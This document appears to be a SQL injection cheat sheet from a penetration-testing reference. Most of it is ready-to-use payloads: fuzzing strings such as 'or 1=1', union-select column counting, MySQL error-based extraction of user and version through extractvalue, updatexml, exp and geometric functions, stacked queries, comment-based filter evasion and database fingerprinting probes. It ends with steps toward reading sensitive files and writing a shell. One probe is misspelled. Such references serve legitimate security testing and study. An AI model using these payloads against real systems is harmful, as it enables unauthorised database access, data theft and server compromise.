Injection detection
=====================================

Common injection points
--------------------------------------
- GET/POST/PUT/DELETE parameters
- X-Forwarded-For
- file name

Fuzz injection point
--------------------------------------
- ``'`` / ``"``
- ``1/1``
- ``1/0``
- ``and 1=1``
- ``" and "1"="1``
- ``and 1=2``
- ``or 1=1``
- ``or 1=``
- ``' and '1'='1``
- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
- ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
- ``~``
- ``!``
- ``@``
- backtick execution

Constants for testing
--------------------------------------
- ``@@version``
- ``@@servername``
- ``@@language``
- ``@@spid``

Number of test columns
--------------------------------------
For example, ``http://www.foo.com/index.asp?id=12+union+select+null,null--``, keep increasing ``null`` until no return

Error injection
--------------------------------------
- ``select 1/0``
- ``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
- ``extractvalue(1, concat(0x5c,(select user())))``
- ``updatexml(0x3a,concat(1,(select user())),1)``
- ``exp(~(SELECT * from(select user())a))``
- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
- ``GTID_SUBSET(version(), 1)``

Error injection based on geometric
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``GeometryCollection((select * from (select * from(select user())a)b))``
- ``polygon((select * from(select * from(select user())a)b))``
- ``multipoint((select * from(select * from(select user())a)b))``
- ``multilinestring((select * from(select * from(select user())a)b))``
- ``LINESTRING((select * from(select * from(select user())a)b))``
- ``multipolygon((select * from(select * from(select user())a)b))``

It should be noted that error injection based on the exp function is no longer effective in versions after MySQL 5.5.49. For details, please refer to this `commit 95825f <https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_.

The geometric-based error injection in the above list is fixed in `commit 5caea4 <https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_, and will no longer take effect in later versions of 5.5.x.

stack injection
--------------------------------------
- ``;select 1``

comment character
--------------------------------------
- ``#``
- ``--+``
- ``/*xxx*/``
- ``/*!xxx*/``
- ``/*!50000xxx*/``

Determine filtering rules
--------------------------------------
- Whether there is trunc
- Whether to filter a certain character
- Whether to filter keywords
- slash and encode

Get information
--------------------------------------
- Determine database type
    - ``and exists (select * from msysobjects ) > 0`` access database
    - ``and exists (select * from sysobjects ) > 0`` SQLServer database

- Determine database tables
    - ``and exsits (select * from admin)``

- Version, host name, user name, library name
- Tables and fields
    - Determine the number of fields
        - Order By
        - Select Into
    - Table name, column name

Test permissions
--------------------------------------
- File operations
    - Read sensitive files
    - write shell
- Out-of-band channel
    - Network requests
